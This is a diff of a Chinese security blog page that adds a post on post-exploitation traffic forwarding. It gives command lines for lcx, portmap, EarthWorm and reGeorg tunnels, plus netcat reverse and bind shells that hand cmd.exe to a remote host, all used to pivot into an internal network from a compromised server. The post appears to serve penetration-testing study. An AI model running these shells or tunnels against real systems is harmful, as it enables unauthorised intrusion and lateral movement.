@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="contant, DarkCrow">
+    <meta name="keywords" content="后渗透之流量转发, DarkCrow">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>contant | DarkCrow</title>
+    <title>后渗透之流量转发 | DarkCrow</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">contant</h1>
+                    <h1 class="description center-align post-title">后渗透之流量转发</h1>
                 </div>
             </div>
         </div>
@@ -464,7 +464,79 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <p>​        在拿到一台服务器shell的时候，如果想要更进一步渗透测试，则需要进行内网渗透，而内网渗透的第一步就是挂代理，在日常生活中常用<code>vpn</code>挂代理去google查资料，自己搭过<code>vpn</code>的人都知道，要在买的<code>vps</code>上搭建<code>ss的服务器端</code>，之后在<code>自己电脑</code>上下载<code>ss的客户端</code>，确定对应的加密协议和密码就能成功转发，而在内网渗透的流量转发是一个道理，是在拿到shell的服务器上使用工具让它变成代理的服务器端，之后在本机使用客户端工具进行连接；</p>
+<h1 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h1><p><strong>端口转发草图：</strong></p>
+<img src="C:\Users\Administrator\Pictures\Saved Pictures\QQ图片20210121215147.jpg" style="zoom:80%;" />
+
+<h3 id="LCX-端口转发"><a href="#LCX-端口转发" class="headerlink" title="LCX 端口转发"></a>LCX 端口转发</h3><p>lcx.exe是一款windows上端口转发工具；</p>
+<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20210121200512870.png" alt="image-20210121200512870"></p>
+<h4 id="·-反向转发"><a href="#·-反向转发" class="headerlink" title="· 反向转发"></a>· 反向转发</h4><blockquote>
+<p>内网主机执行：lcx.exe  -slave 公网主机IP 公网主机端口 内网主机IP 内网主机端口</p>
+</blockquote>
+<blockquote>
+<p>公网主机执行：lcx.exe  -listen 公网主机端口1 公网主机端口2</p>
+</blockquote>
+<p>验证：打开远程桌面连接win+R 输入命令 mstsc</p>
+<p>​            公网主机上计算机栏输入127.0.0.1：公网主机端口2，即可连接到内网主机；</p>
+<p>​            本地主机上计算机栏输入公网主机IP：公网主机端口2，即可连接到内网主机；</p>
+<h4 id="·正向转发"><a href="#·正向转发" class="headerlink" title="·正向转发"></a>·正向转发</h4><blockquote>
+<p>目标主机执行：lcx.exe -tran 53 目标主机ip 3389</p>
+</blockquote>
+<p>验证：任何主机远程连接目标主机的53端口，即可连接到目标主机；</p>
+<h3 id="port-map端口转发"><a href="#port-map端口转发" class="headerlink" title="port map端口转发"></a>port map端口转发</h3><p>portmap是一款linux上端口转发工具</p>
+<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20210121200257898.png" alt="image-20210121200257898"></p>
+<h4 id="·反向转发"><a href="#·反向转发" class="headerlink" title="·反向转发"></a>·反向转发</h4><blockquote>
+<p>内网主机执行：./portmap -m 3 -h1 内网主机IP -p1 22 -h2 公网主机IP -p2 6666</p>
+</blockquote>
+<blockquote>
+<p>公网主机执行：./portmap -m 2 -p1 6666 -h2 公网主机IP -p2 7777</p>
+</blockquote>
+<p>验证：ssh 公网主机IP 7777，即可连接到内网主机</p>
+<h4 id="·正向转发-1"><a href="#·正向转发-1" class="headerlink" title="·正向转发"></a>·正向转发</h4><blockquote>
+<p>目标主机上执行：./portmap -m 1 -h1 内网主机IP -p1 22  -p2 6666</p>
+</blockquote>
+<p>验证：ssh 内网主机IP 6666，即可连接到内网主机</p>
+<h3 id="NC反弹"><a href="#NC反弹" class="headerlink" title="NC反弹"></a>NC反弹</h3><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20210121200640602.png" alt="image-20210121200640602"></p>
+<h4 id="·反向连接"><a href="#·反向连接" class="headerlink" title="·反向连接"></a>·反向连接</h4><blockquote>
+<p>公网主机监听：nc -lvp 端口</p>
+<p>内网主机执行：nc -t -e cmd.exe 公网主机IP 端口</p>
+</blockquote>
+<p>验证：成功后公网主机即可得到内网主机的cmd shell</p>
+<h4 id="·正向连接"><a href="#·正向连接" class="headerlink" title="·正向连接"></a>·正向连接</h4><blockquote>
+<p>远程主机执行：nc -l -p 端口 -e cmd.exe</p>
+<p>本地主机执行：nc -v 远程主机IP 端口</p>
+</blockquote>
+<p>验证：成功后本地主机即可得到远程主机的cmd shell</p>
+<h1 id="流量转发"><a href="#流量转发" class="headerlink" title="流量转发"></a>流量转发</h1><h4 id="Termite-是EW（EarthWorm）的最新版，官方链接：-http-rootkiter-com-Termite"><a href="#Termite-是EW（EarthWorm）的最新版，官方链接：-http-rootkiter-com-Termite" class="headerlink" title="Termite 是EW（EarthWorm）的最新版，官方链接： http://rootkiter.com/Termite/"></a>Termite 是EW（EarthWorm）的最新版，官方链接： <a target="_blank" rel="noopener" href="http://rootkiter.com/Termite/">http://rootkiter.com/Termite/</a></h4><p>主要特性： 多平台支持、跳板机互联、正反向级联、小巧无依赖、内置Shell令主机管理更方便</p>
+<h4 id="EW（EarthWorm）"><a href="#EW（EarthWorm）" class="headerlink" title="EW（EarthWorm）"></a>EW（EarthWorm）</h4><p>![](C:\Users\Administrator\Pictures\Saved Pictures\ew.png)</p>
+<h4 id="·正向端口转发"><a href="#·正向端口转发" class="headerlink" title="·正向端口转发"></a>·正向端口转发</h4><blockquote>
+<p>目标主机执行：ew -s  lcx_tran -l 53 -f 目标主机ip -g 3389</p>
+</blockquote>
+<h4 id="·反向端口转发"><a href="#·反向端口转发" class="headerlink" title="·反向端口转发"></a>·反向端口转发</h4><blockquote>
+<p>内网主机执行：ew -s lcx_slave -d 公网主机IP -e 公网主机端口 -f 内网主机IP -g 内网主机端口</p>
+</blockquote>
+<blockquote>
+<p>公网主机执行：ew -s  lcx_listen -l 公网主机端口1 -e 公网主机端口2</p>
+</blockquote>
+<h4 id="·正向代理"><a href="#·正向代理" class="headerlink" title="·正向代理"></a>·正向代理</h4><blockquote>
+<p>目标主机执行：./ew -s ssocksd -l 888                  <!--攻击主机通过访问目标主机888端口使用目标主机提供的代理-->   </p>
+</blockquote>
+<p>攻击主机开启一个IP为目标主机IP端口为888的代理就可以使用了</p>
+<h4 id="·反向代理"><a href="#·反向代理" class="headerlink" title="·反向代理"></a>·反向代理</h4><blockquote>
+<p>公网主机执行：./ew -s rcsocks -l 1080 -e 1024        <!--监听本机的1080端口并把收到的代理请求转发到1024端口上--></p>
+</blockquote>
+<blockquote>
+<p>目标主机执行：ew -s rssocks -d 公网IP -e 1024     <!--启动代理通过socks隧道并反弹到公网IP的1024端口上-->       </p>
+</blockquote>
+<h4 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h4><p>reGeorg是reDuh的升级版   工具地址： <a target="_blank" rel="noopener" href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></p>
+<p>使用方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python reGeorgSocksProxy.py -p 8080 -u http:&#x2F;&#x2F;upload.sensepost.net:8080&#x2F;tunnel&#x2F;tunnel.jsp</span><br></pre></td></tr></table></figure>
+<p>[^注]: 运行.py脚本 去访问目标主机上相对应传上去的脚本文件</p>
+<p>Tomcat运行tunnel.php</p>
+<p>非Tomcat运行tunnel.nosocket.php</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhaijiahui/p/11560899.html">reGeorg+Proxifier使用</a></p>
+<h3 id="frp内网穿透"><a href="#frp内网穿透" class="headerlink" title="frp内网穿透"></a>frp内网穿透</h3><h5 id="内网漫游之SOCKS代理大结局"><a href="#内网漫游之SOCKS代理大结局" class="headerlink" title="内网漫游之SOCKS代理大结局"></a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/pshell/p/7649095.html">内网漫游之SOCKS代理大结局</a></h5><h6 id="浅谈内网端口转发"><a href="#浅谈内网端口转发" class="headerlink" title="浅谈内网端口转发"></a><a target="_blank" rel="noopener" href="https://www.freebuf.com/network/210653.html">浅谈内网端口转发</a></h6><p>​    </p>
+
                 
             </div>
             <hr/>
@@ -490,7 +562,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://gitman-yy.github.io/contant/index.html">https://gitman-yy.github.io/contant/index.html</a>
+                    <a href="https://gitman-yy.github.io/2021/01/31/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/">https://gitman-yy.github.io/2021/01/31/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -702,13 +774,13 @@
                 <i class="far fa-dot-circle"></i>&nbsp;本篇
             </div>
             <div class="card">
-                <a href="/contant/index.html">
+                <a href="/2021/01/31/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="contant">
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="后渗透之流量转发">
                         
-                        <span class="card-title">contant</span>
+                        <span class="card-title">后渗透之流量转发</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -737,16 +809,16 @@
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/contant/index.html">
+                <a href="/2021/01/31/%E5%89%8D%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="contant">
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="渗透测试之信息收集">
                         
-                        <span class="card-title">contant</span>
+                        <span class="card-title">渗透测试之信息收集</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -767,7 +839,6 @@
                         </span>
                     </div>
                 </div>
-
                 
             </div>
         </div>
